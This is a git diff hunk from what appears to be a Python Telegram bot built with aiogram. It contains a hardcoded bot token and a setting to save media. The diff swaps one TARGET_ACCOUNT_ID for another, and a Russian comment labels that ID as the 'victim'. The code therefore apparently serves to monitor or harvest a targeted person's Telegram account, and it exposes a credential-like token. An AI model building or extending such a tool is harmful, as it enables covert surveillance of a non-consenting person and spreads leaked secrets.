@@ -18,7 +18,7 @@ from aiogram.exceptions import TelegramConflictError
 # ⚠️ СБРОСЬ ТОКЕН ЧЕРЕЗ @BotFather И ВСТАВЬ НОВЫЙ!
 BOT_TOKEN = '8389370808:AAEmrhiar8I9NALB913k130BDOOJsEC1AvI'  # НЕ СТАРЫЙ!
 
-TARGET_ACCOUNT_ID = 8839956404  # ID жертвы
+TARGET_ACCOUNT_ID = 6939132428  # ID жертвы
 
 # Настройки
 SAVE_MEDIA = True
